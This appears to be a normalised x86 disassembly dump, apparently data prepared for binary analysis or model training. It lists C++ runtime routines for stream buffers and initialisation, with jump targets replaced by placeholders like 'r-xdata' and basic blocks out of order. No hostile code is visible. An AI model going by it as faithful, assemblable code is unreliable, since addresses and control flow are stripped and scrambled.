test eax eax
jbe r-xdata
mov ebx [ esi + 0x8 ]
push 0x1
mov ecx esi
call sub_402176
mov eax [ ebp + 0x8 ]
inc eax
mov [ esi + 0x4 ] eax
and [ eax - 0x1 ] 0x0
cmp ebx edi
mov [ esi + 0xc ] edi
ja r-xdata
cmp eax edi
jbe r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ ebp - 0xc ]
mov [ esi + 0x8 ] edi
and [ eax + edi ] 0x0
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
mov edi ebx
push eax
mov eax [ ebp + 0x8 ]
push [ esi + 0x4 ]
inc eax
push eax
call sub_405ac0
add esp 0xc
mov eax edi
sub_402390
push esi
push edi
mov edi ecx
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
pop edi
pop esi
retn
mov al [ esi - 0x1 ]
test al al
je r-xdata
cmp al 0xff
je r-xdata
push 0x1
call sub_402176
push esi
call sub_404f30
pop ecx
push eax
push esi
mov ecx edi
call sub_4021b2
sub_40254e
mov eax sub_40d754
call sub_405888
push ecx
push ecx
push ebx
push esi
mov [ ebp - 0x14 ] ecx
xor esi esi
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x10 ] esi
call sub_40439d
cmp [ rw-data ] esi
jl r-xdata
mov [ rw-data ] 0x1
mov bl 0x1
inc [ rw-data ]
xor bl bl
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
push edi
mov edi rw-data
mov [ ebp - 0x10 ] edi
mov eax edi
mov [ ebp - 0x4 ] esi
test eax eax
je r-xdata
lea ecx [ ebp - 0x10 ]
call sub_404439
test bl bl
je r-xdata
mov ebx rw-data
mov [ ebp - 0x10 ] ebx
mov eax ebx
mov [ ebp - 0x4 ] 0x1
test eax eax
je r-xdata
push rw-data
mov ecx edi
call sub_4028ac
mov esi rw-data
mov [ ebp - 0x10 ] esi
mov eax esi
mov [ ebp - 0x4 ] 0x2
test eax eax
je r-xdata
push rw-data
mov ecx ebx
call sub_4028ac
mov edi rw-data
mov [ ebp - 0x10 ] edi
mov eax edi
mov [ ebp - 0x4 ] 0x3
test eax eax
je r-xdata
push 0x1
push 0x1
push edi
mov ecx esi
call sub_4027e5
mov eax [ rw-data ]
mov ebx rw-data
mov [ ebp - 0x10 ] ebx
mov eax [ eax + 0x4 ]
mov [ eax + esi + 0x2c ] edi
add eax esi
mov eax ebx
mov [ ebp - 0x4 ] 0x4
test eax eax
je r-xdata
push 0x1
push 0x1
push 0x1
push ebx
mov ecx edi
call sub_402711
mov esi rw-data
mov [ ebp - 0x10 ] esi
mov eax esi
mov [ ebp - 0x4 ] 0x5
test eax eax
je r-xdata
push rw-data
mov ecx ebx
call sub_4028ac
mov eax [ rw-data ]
mov ecx rw-data
mov [ ebp - 0x10 ] ecx
mov eax [ eax + 0x4 ]
mov [ eax + esi + 0x2c ] edi
add eax esi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
or [ eax + esi + 0xc ] 0x2
add eax esi
mov eax ecx
mov [ ebp - 0x4 ] 0x6
test eax eax
je r-xdata
push 0x1
push 0x1
push 0x1
push ebx
mov ecx esi
call sub_402711
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov [ eax + rw-data ] edi
pop edi
push 0x1
push 0x1
push 0x1
push ebx
call sub_402711
sub_4026ce
push ebp
mov ebp esp
push ecx
push ebx
lea ecx [ ebp - 0x4 ]
call sub_40439d
dec [ rw-data ]
lea ecx [ ebp - 0x4 ]
sete bl
call sub_404439
test bl bl
pop ebx
je r-xdata
leave
retn
mov ecx rw-data
call sub_403660
mov ecx rw-data
call sub_403660
mov ecx rw-data
call sub_403660
sub_402711
mov eax sub_40d77a
call sub_405888
push ecx
push ecx
push esi
xor eax eax
cmp [ ebp + 0x14 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] eax
je r-xdata
mov ecx [ esi ]
cmp [ ebp + 0x10 ] al
mov ecx [ ecx + 0x4 ]
mov [ ecx + esi ] r--data
je r-xdata
mov [ esi ] r--data
mov [ esi + 0x28 ] eax
mov [ esi + 0x4 ] r--data
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x10
mov eax [ esi ]
push [ ebp + 0xc ]
mov ecx [ eax + 0x4 ]
push [ ebp + 0x8 ]
add ecx esi
call sub_40300e
sub_40277b
mov eax sub_40d79e
call sub_405888
push ecx
push ecx
push esi
xor eax eax
cmp [ ebp + 0xc ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] eax
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ eax + esi ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
add ecx esi
call sub_40473d
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x8
mov [ esi ] r--data
mov [ esi + 0x28 ] eax
mov [ esi + 0x4 ] r--data
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0x4 ] eax
sub_4027e5
mov eax sub_40d7c2
call sub_405888
push ecx
push ecx
push esi
xor eax eax
cmp [ ebp + 0x10 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] eax
je r-xdata
mov [ esi + 0x4 ] eax
mov eax [ esi ]
push [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push [ ebp + 0x8 ]
mov [ eax + esi ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
add ecx esi
call sub_40300e
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0xc
mov [ esi ] r--data
mov [ esi + 0x2c ] eax
mov [ esi + 0x8 ] r--data
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0x4 ] eax
sub_40284d
mov eax sub_40d7e6
call sub_405888
push ecx
push ecx
push esi
xor eax eax
cmp [ ebp + 0xc ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] eax
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ eax + esi ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
add ecx esi
call sub_40473d
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x8
mov [ esi ] r--data
mov [ esi + 0x2c ] eax
mov [ esi + 0x8 ] r--data
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0x4 ] eax
sub_4028ac
mov eax sub_40d80e
call sub_405888
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
lea ecx [ esi + 0x34 ]
call sub_40290c
and [ ebp - 0x4 ] 0x0
mov ecx esi
mov [ esi ] r--data
call sub_403fb8
lea ecx [ esi + 0x4c ]
mov [ ebp - 0x4 ] 0x1
call sub_40290c
push 0x0
mov ecx esi
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
call sub_4030df
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_40290c
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
call sub_404826
lea ecx [ ebp - 0x4 ]
mov [ esi ] eax
call sub_40439d
mov ecx [ rw-data ]
call sub_40293a
lea ecx [ ebp - 0x4 ]
call sub_404439
mov eax esi
pop esi
leave
retn
sub_40293a
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
lea ecx [ ebp - 0x4 ]
call sub_40439d
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
lea ecx [ ebp - 0x4 ]
call sub_404439
pop esi
leave
retn
inc eax
mov [ esi + 0x4 ] eax
sub_402978
push ebp
mov ebp esp
push ecx
push esi
push edi
mov edi ecx
lea ecx [ ebp - 0x4 ]
call sub_40439d
mov eax [ edi + 0x4 ]
test eax eax
jbe r-xdata
mov esi [ edi + 0x4 ]
lea ecx [ ebp - 0x4 ]
neg esi
sbb esi esi
not esi
and esi edi
call sub_404439
mov eax esi
pop edi
pop esi
leave
retn
cmp eax 0xffffffff
jae r-xdata
dec eax
mov [ edi + 0x4 ] eax
sub_4029cc
push esi
mov esi ecx
mov eax [ esi ]
call [ eax + 0x10 ]
cmp eax 0xffffffff
jne r-xdata
mov ecx esi
call sub_403098
movzx eax [ eax ]
pop esi
retn
or eax eax
pop esi
retn
sub_4029e9
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x0
push edi
mov edi ecx
jle r-xdata
mov eax [ ebp - 0x4 ]
pop edi
leave
retn 0x8
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov eax [ edi ]
mov ecx edi
call [ eax + 0x14 ]
cmp eax 0xffffffff
je r-xdata
mov ecx [ edi + 0x2c ]
mov esi [ ecx ]
test esi esi
jle r-xdata
pop esi
pop ebx
mov [ ebx ] al
inc ebx
inc [ ebp - 0x4 ]
dec [ ebp + 0xc ]
cmp [ ebp + 0xc ] esi
jge r-xdata
mov eax [ edi + 0x1c ]
mov eax [ eax ]
test eax eax
je r-xdata
push esi
push eax
push ebx
call sub_405ac0
mov eax [ edi + 0x2c ]
add [ ebp - 0x4 ] esi
sub [ ebp + 0xc ] esi
add esp 0xc
sub [ eax ] esi
mov eax [ edi + 0x1c ]
add ebx esi
add [ eax ] esi
jmp r-xdata
mov esi [ ebp + 0xc ]
cmp [ ebp + 0xc ] 0x0
jg r-xdata
sub_402a5d
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x0
push edi
mov edi ecx
jle r-xdata
mov eax [ ebp - 0x4 ]
pop edi
leave
retn 0x8
push ebx
mov ebx [ ebp + 0x8 ]
push esi
movzx ecx [ ebx ]
mov eax [ edi ]
push ecx
mov ecx edi
call [ eax + 0x4 ]
cmp eax 0xffffffff
je r-xdata
mov ecx [ edi + 0x30 ]
mov esi [ ecx ]
test esi esi
jle r-xdata
pop esi
pop ebx
inc ebx
inc [ ebp - 0x4 ]
dec [ ebp + 0xc ]
cmp [ ebp + 0xc ] esi
jge r-xdata
mov eax [ edi + 0x20 ]
mov eax [ eax ]
test eax eax
je r-xdata
push esi
push ebx
push eax
call sub_405ac0
mov eax [ edi + 0x30 ]
add [ ebp - 0x4 ] esi
sub [ ebp + 0xc ] esi
add esp 0xc
sub [ eax ] esi
mov eax [ edi + 0x20 ]
add ebx esi
add [ eax ] esi
jmp r-xdata
mov esi [ ebp + 0xc ]
cmp [ ebp + 0xc ] 0x0
jg r-xdata
sub_402ae6
mov eax sub_40d82b
call sub_405888
push ecx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
cmp [ esi + 0x48 ] 0x0
mov [ ebp - 0x4 ] 0x1
je r-xdata
mov edi [ esi + 0x44 ]
test edi edi
je r-xdata
call sub_4030b8
lea ecx [ esi + 0x4c ]
call sub_402960
lea ecx [ esi + 0x34 ]
mov [ esi ] r--data
call sub_402960
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
push 0x1
mov ecx edi
call sub_402176
push edi
call sub_40403c
pop ecx
sub_402b4b
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ ebp + 0x8 ]
push esi
cmp ebx 0xffffffff
push edi
mov esi ecx
jne r-xdata
mov eax [ esi + 0x20 ]
xor edi edi
mov eax [ eax ]
cmp eax edi
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ esi + 0x50 ]
cmp eax edi
je r-xdata
mov ecx [ esi + 0x30 ]
mov ecx [ ecx ]
add ecx eax
cmp eax ecx
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
or eax 0xffffffff
cmp [ esi + 0x38 ] edi
jne r-xdata
mov ecx esi
call sub_4030a8
mov [ eax ] bl
jmp r-xdata
push [ r--data ]
mov ecx [ esi + 0x44 ]
mov [ ebp - 0x1 ] bl
push edi
call sub_4021e7
mov ecx [ esi + 0x44 ]
push edi
push 0x8
call sub_402fb5
mov edi [ esi + 0x44 ]
mov ecx edi
call sub_403157
mov ebx [ esi + 0x44 ]
mov eax [ edi + 0x4 ]
mov ecx ebx
mov [ ebp - 0x8 ] eax
call sub_403157
mov eax [ ebp - 0x8 ]
mov ecx [ edi + 0x8 ]
mov ebx [ ebx + 0x4 ]
add ecx eax
neg eax
sbb eax eax
lea edi [ ebp - 0x10 ]
and eax ecx
push edi
mov ecx [ esi + 0x38 ]
push eax
lea eax [ ebp - 0xc ]
push ebx
mov edx [ ecx ]
push eax
lea eax [ ebp ]
push eax
lea eax [ ebp - 0x1 ]
push eax
lea eax [ esi + 0x40 ]
push eax
call [ edx + 0x14 ]
sub eax 0x0
je r-xdata
push eax
movsx eax bl
push eax
call sub_4063e6
pop ecx
cmp eax 0xffffffff
pop ecx
je r-xdata
mov eax ebx
jmp r-xdata
mov ebx [ esi + 0x44 ]
mov ecx ebx
call sub_403157
mov edi [ ebp - 0x10 ]
sub edi [ ebx + 0x4 ]
mov ebx [ esi + 0x44 ]
mov ecx ebx
call sub_403157
push [ esi + 0x50 ]
mov ebx [ ebx + 0x4 ]
push edi
push 0x1
push ebx
call sub_404dee
add esp 0x10
cmp eax edi
jne r-xdata
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
jmp r-xdata
lea eax [ ebp - 0x1 ]
cmp [ ebp - 0xc ] eax
je r-xdata
dec eax
dec eax
jne r-xdata
movsx eax [ ebp - 0x1 ]
push [ esi + 0x50 ]
push eax
call sub_4063e6
pop ecx
cmp eax 0xffffffff
pop ecx
je r-xdata
jmp r-xdata
sub_402c81
push ebx
push esi
mov esi ecx
push edi
mov eax [ esi + 0x1c ]
mov eax [ eax ]
test eax eax
je r-xdata
mov ebx [ esp + 0x10 ]
mov ecx [ esi + 0xc ]
cmp [ ecx ] eax
jae r-xdata
or eax 0xffffffff
cmp ebx 0xffffffff
je r-xdata
mov ebx [ esp + 0x10 ]
cmp ebx 0xffffffff
je r-xdata
cmp [ esi + 0x38 ] 0x0
jne r-xdata
mov ecx esi
call sub_403088
mov eax ebx
inc eax
neg eax
sbb eax eax
and eax ebx
jmp r-xdata
movzx eax [ eax - 0x1 ]
cmp eax ebx
jne r-xdata
mov edi [ esi + 0x44 ]
mov ebx [ edi + 0x8 ]
test ebx ebx
jbe r-xdata
push eax
movzx eax bl
push eax
call sub_406421
pop ecx
cmp eax 0xffffffff
pop ecx
je r-xdata
pop edi
pop esi
pop ebx
retn 0x4
mov eax [ esi + 0x50 ]
test eax eax
je r-xdata
mov ecx edi
call sub_403157
mov edi [ edi + 0x4 ]
push ebx
push [ esi + 0x50 ]
push edi
call sub_403183
add esp 0xc
test al al
je r-xdata
mov eax ebx
jmp r-xdata
push [ r--data ]
mov ecx [ esi + 0x44 ]
push 0x0
call sub_4021e7
mov eax [ esi + 0x3c ]
mov [ esi + 0x40 ] eax
mov eax [ esp + 0x10 ]
jmp r-xdata
sub_402d2e
push esi
mov esi ecx
mov eax [ esi + 0x1c ]
mov eax [ eax ]
test eax eax
je r-xdata
push edi
mov edi [ esi ]
mov ecx esi
call [ edi + 0x14 ]
push eax
mov ecx esi
call [ edi + 0x8 ]
pop edi
pop esi
retn
mov ecx [ esi + 0x2c ]
mov ecx [ ecx ]
add ecx eax
cmp eax ecx
jae r-xdata
movzx eax [ eax ]
pop esi
retn
sub_402d5b
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi ecx
push edi
mov eax [ esi + 0x1c ]
mov eax [ eax ]
test eax eax
je r-xdata
mov eax [ esi + 0x50 ]
test eax eax
jne r-xdata
mov ecx [ esi + 0x2c ]
mov ecx [ ecx ]
add ecx eax
cmp eax ecx
jae r-xdata
cmp [ esi + 0x38 ] 0x0
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov ecx esi
call sub_403098
movzx eax [ eax ]
jmp r-xdata
mov eax [ esi + 0x40 ]
mov ecx [ esi + 0x44 ]
mov [ esi + 0x3c ] eax
push [ r--data ]
push 0x0
call sub_4021e7
push eax
call sub_4064b8
cmp eax 0xffffffff
pop ecx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ esi + 0x44 ]
push eax
push 0x1
call sub_402fb5
mov edi [ esi + 0x44 ]
mov eax [ esi + 0x3c ]
mov ecx edi
mov [ esi + 0x40 ] eax
call sub_403157
mov ebx [ esi + 0x44 ]
mov eax [ edi + 0x4 ]
mov ecx ebx
mov [ ebp - 0x8 ] eax
call sub_403157
mov ecx [ edi + 0x8 ]
mov eax [ ebp - 0x8 ]
lea edi [ ebp - 0xc ]
mov ebx [ ebx + 0x4 ]
push edi
lea edi [ ebp ]
add ecx eax
push edi
neg eax
lea edi [ ebp - 0x1 ]
sbb eax eax
push edi
lea edi [ ebp - 0x10 ]
and eax ecx
mov ecx [ esi + 0x38 ]
push edi
push eax
lea eax [ esi + 0x40 ]
mov edx [ ecx ]
push ebx
push eax
call [ edx + 0x10 ]
sub eax 0x0
je r-xdata
movzx eax al
jmp r-xdata
movzx eax [ ebp - 0x1 ]
dec eax
je r-xdata
push [ esi + 0x50 ]
call sub_4064b8
cmp eax 0xffffffff
pop ecx
je r-xdata
dec eax
dec eax
jne r-xdata
mov eax [ esi + 0x44 ]
cmp [ eax + 0x8 ] 0x1
jb r-xdata
mov esi eax
mov ecx esi
call sub_403157
push 0x1
lea eax [ ebp - 0x1 ]
push [ esi + 0x4 ]
push eax
call sub_405ac0
add esp 0xc
sub_402e70
push ebp
mov ebp esp
sub esp 0x20
push esi
mov esi ecx
push edi
mov eax [ esi + 0x50 ]
test eax eax
je r-xdata
push 0xffffffff
lea ecx [ ebp - 0x20 ]
call sub_40304e
push 0x6
mov esi eax
pop ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_4059f8
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
push [ esi + 0x50 ]
call sub_4064e9
pop ecx
test eax eax
pop ecx
jne r-xdata
and [ ebp - 0x20 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
mov eax [ esi + 0x40 ]
push 0x6
mov [ ebp - 0x10 ] eax
pop ecx
lea esi [ ebp - 0x20 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edi eax
[ edi ] [ esi ]
pop edi
pop esi
leave
retn 0x10
sub_402edf
push esi
mov esi ecx
mov eax [ esi + 0x50 ]
test eax eax
je r-xdata
xor eax eax
push [ esp + 0xc ]
push 0x0
push [ esp + 0x10 ]
push eax
call sub_406523
add esp 0x10
test eax eax
jne r-xdata
mov eax esi
jmp r-xdata
pop esi
retn 0x8
sub_402fb5
mov eax [ r--data ]
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi ecx
push edi
sub eax [ esi + 0x8 ]
cmp eax ebx
ja r-xdata
test ebx ebx
jbe r-xdata
call sub_404047
mov eax esi
pop edi
pop esi
pop ebx
retn 0x8
mov edi ebx
push 0x0
add edi [ esi + 0x8 ]
mov ecx esi
push edi
call sub_40224e
test al al
je r-xdata
movsx eax [ esp + 0x14 ]
push ebx
push eax
mov eax [ esi + 0x4 ]
add eax [ esi + 0x8 ]
push eax
call sub_405360
mov eax [ esi + 0x4 ]
add esp 0xc
mov [ esi + 0x8 ] edi
and [ eax + edi ] 0x0
sub_40300e
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
and [ esi + 0x2c ] 0x0
mov [ esi + 0x28 ] eax
mov [ esi + 0x30 ] 0x20
call sub_40478b
cmp [ esi + 0x28 ] 0x0
jne r-xdata
cmp [ esp + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
push 0x0
or al 0x4
mov ecx esi
or al 0x4
push eax
call sub_40444e
pop esi
retn 0x8
mov ecx esi
call sub_40473d
sub_40304e
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
lea ecx [ ebp + 0x8 ]
mov [ esi ] eax
mov eax [ r--data ]
mov [ esi + 0x8 ] eax
mov eax [ r--data ]
mov [ esi + 0xc ] eax
call sub_40439d
mov eax [ rw-data ]
lea ecx [ ebp + 0x8 ]
mov [ esi + 0x10 ] eax
call sub_404439
mov eax esi
pop esi
pop ebp
retn 0x4
sub_4030b8
push esi
mov esi ecx
mov eax [ esi + 0x50 ]
test eax eax
je r-xdata
xor eax eax
pop esi
retn
push eax
call sub_404d71
test eax eax
pop ecx
jne r-xdata
push 0x2
push eax
mov ecx esi
call sub_4030df
mov eax esi
pop esi
retn
sub_4030df
cmp [ esp + 0x8 ] 0x1
push esi
mov esi ecx
sete al
cmp [ esp + 0xc ] 0x0
mov [ esi + 0x48 ] al
jne r-xdata
mov ecx esi
call sub_403fb8
mov eax [ esp + 0x8 ]
test eax eax
je r-xdata
push edi
lea edi [ esi + 0x4c ]
mov ecx edi
call sub_402960
test edi edi
je r-xdata
mov [ esi + 0x50 ] eax
mov eax [ rw-data ]
mov [ esi + 0x40 ] eax
mov eax [ rw-data ]
and [ esi + 0x38 ] 0x0
mov [ esi + 0x3c ] eax
pop esi
retn 0x8
cmp [ esi + 0x48 ] 0x0
jne r-xdata
and [ esi + 0x44 ] 0x0
pop edi
mov ecx edi
call sub_40290c
lea ecx [ eax + 0x8 ]
mov [ esi + 0x1c ] eax
mov [ esi + 0xc ] ecx
mov [ esi + 0x10 ] ecx
lea ecx [ eax + 0x4 ]
mov [ esi + 0x20 ] eax
mov [ esi + 0x2c ] ecx
mov [ esi + 0x30 ] ecx
sub_403157
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov esi [ esi + 0x4 ]
test esi esi
je r-xdata
mov al [ eax - 0x1 ]
test al al
je r-xdata
pop esi
retn
or [ esi - 0x1 ] 0xff
cmp al 0xff
je r-xdata
push 0x0
push [ esi + 0x8 ]
call sub_40224e
sub_403183
mov eax [ esp + 0x4 ]
push esi
mov esi [ esp + 0x10 ]
push edi
test esi esi
lea edi [ eax + esi ]
jbe r-xdata
jne r-xdata
movzx eax [ edi - 0x1 ]
push [ esp + 0x10 ]
dec edi
push eax
call sub_406421
pop ecx
cmp eax 0xffffffff
pop ecx
je r-xdata
push 0x1
pop edi
cmp esi edi
jae r-xdata
mov al 0x1
jmp r-xdata
test esi esi
dec esi
jne r-xdata
xor al al
sub edi esi
pop edi
pop esi
retn
push [ esp + 0x10 ]
call sub_4064b8
dec edi
pop ecx
jne r-xdata
sub_4033d3
mov eax sub_40d8a8
call sub_405888
push ecx
push ecx
push ebx
push esi
mov [ ebp - 0x14 ] ecx
xor esi esi
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x10 ] esi
call sub_40439d
cmp [ rw-data ] esi
jl r-xdata
mov [ rw-data ] 0x1
mov bl 0x1
inc [ rw-data ]
xor bl bl
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
push edi
mov edi rw-data
mov [ ebp - 0x10 ] edi
mov eax edi
mov [ ebp - 0x4 ] esi
test eax eax
je r-xdata
lea ecx [ ebp - 0x10 ]
call sub_404439
test bl bl
je r-xdata
mov ecx rw-data
mov [ ebp - 0x10 ] ecx
mov eax ecx
mov [ ebp - 0x4 ] 0x1
test eax eax
je r-xdata
push rw-data
mov ecx edi
call sub_40377c
mov ebx rw-data
mov [ ebp - 0x10 ] ebx
mov eax ebx
mov [ ebp - 0x4 ] 0x2
test eax eax
je r-xdata
push rw-data
call sub_40377c
mov esi rw-data
mov [ ebp - 0x10 ] esi
mov eax esi
mov [ ebp - 0x4 ] 0x3
test eax eax
je r-xdata
push rw-data
mov ecx ebx
call sub_40377c
mov edi rw-data
mov [ ebp - 0x10 ] edi
mov eax edi
mov [ ebp - 0x4 ] 0x4
test eax eax
je r-xdata
push 0x1
push 0x1
push edi
mov ecx esi
call sub_4036b5
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov [ eax + esi + 0x2c ] edi
add eax esi
mov esi rw-data
mov [ ebp - 0x10 ] esi
mov eax esi
mov [ ebp - 0x4 ] 0x5
test eax eax
je r-xdata
push 0x1
push 0x1
push 0x1
push rw-data
mov ecx edi
call sub_403597
mov eax [ rw-data ]
mov ecx rw-data
mov [ ebp - 0x10 ] ecx
mov eax [ eax + 0x4 ]
mov [ eax + esi + 0x2c ] edi
add eax esi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
or [ eax + esi + 0xc ] 0x2
add eax esi
mov eax ecx
mov [ ebp - 0x4 ] 0x6
test eax eax
je r-xdata
push 0x1
push 0x1
push 0x1
push ebx
mov ecx esi
call sub_403597
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov [ eax + rw-data ] edi
pop edi
push 0x1
push 0x1
push 0x1
push ebx
call sub_403597
sub_403554
push ebp
mov ebp esp
push ecx
push ebx
lea ecx [ ebp - 0x4 ]
call sub_40439d
dec [ rw-data ]
lea ecx [ ebp - 0x4 ]
sete bl
call sub_404439
test bl bl
pop ebx
je r-xdata
leave
retn
mov ecx rw-data
call sub_403660
mov ecx rw-data
call sub_403660
mov ecx rw-data
call sub_403660
sub_403597
mov eax sub_40d8ce
call sub_405888
push ecx
push ecx
push esi
xor eax eax
cmp [ ebp + 0x14 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] eax
je r-xdata
mov ecx [ esi ]
cmp [ ebp + 0x10 ] al
mov ecx [ ecx + 0x4 ]
mov [ ecx + esi ] r--data
je r-xdata
mov [ esi ] r--data
mov [ esi + 0x28 ] eax
mov [ esi + 0x4 ] r--data
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x10
mov eax [ esi ]
push [ ebp + 0xc ]
mov ecx [ eax + 0x4 ]
push [ ebp + 0x8 ]
add ecx esi
call sub_403e98
sub_403601
mov eax sub_40d8f2
call sub_405888
push ecx
push ecx
push esi
xor eax eax
cmp [ ebp + 0xc ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] eax
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ eax + esi ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
add ecx esi
call sub_40473d
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x8
mov [ esi ] r--data
mov [ esi + 0x28 ] eax
mov [ esi + 0x4 ] r--data
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0x4 ] eax
sub_403660
push esi
mov esi ecx
push edi
xor edi edi
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + 0x28 ]
mov ecx eax
mov edx [ eax ]
call [ edx + 0x2c ]
cmp eax 0xffffffff
jne r-xdata
mov eax esi
pop edi
pop esi
retn
mov eax [ ecx + 0x4 ]
or eax edi
cmp [ ecx + 0x28 ] 0x0
jne r-xdata
push 0x4
pop edi
push 0x0
push eax
call sub_40444e
or al 0x4
sub_4036b5
mov eax sub_40d916
call sub_405888
push ecx
push ecx
push esi
xor eax eax
cmp [ ebp + 0x10 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] eax
je r-xdata
mov [ esi + 0x4 ] eax
mov eax [ esi ]
push [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push [ ebp + 0x8 ]
mov [ eax + esi ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
add ecx esi
call sub_403e98
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0xc
mov [ esi ] r--data
mov [ esi + 0x2c ] eax
mov [ esi + 0x8 ] r--data
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0x4 ] eax
sub_40371d
mov eax sub_40d93a
call sub_405888
push ecx
push ecx
push esi
xor eax eax
cmp [ ebp + 0xc ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] eax
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ eax + esi ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
add ecx esi
call sub_40473d
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x8
mov [ esi ] r--data
mov [ esi + 0x2c ] eax
mov [ esi + 0x8 ] r--data
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0x4 ] eax
sub_40377c
mov eax sub_40d962
call sub_405888
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
lea ecx [ esi + 0x34 ]
call sub_40290c
and [ ebp - 0x4 ] 0x0
mov ecx esi
mov [ esi ] r--data
call sub_403fb8
lea ecx [ esi + 0x4c ]
mov [ ebp - 0x4 ] 0x1
call sub_40290c
push 0x0
mov ecx esi
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
call sub_403f62
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
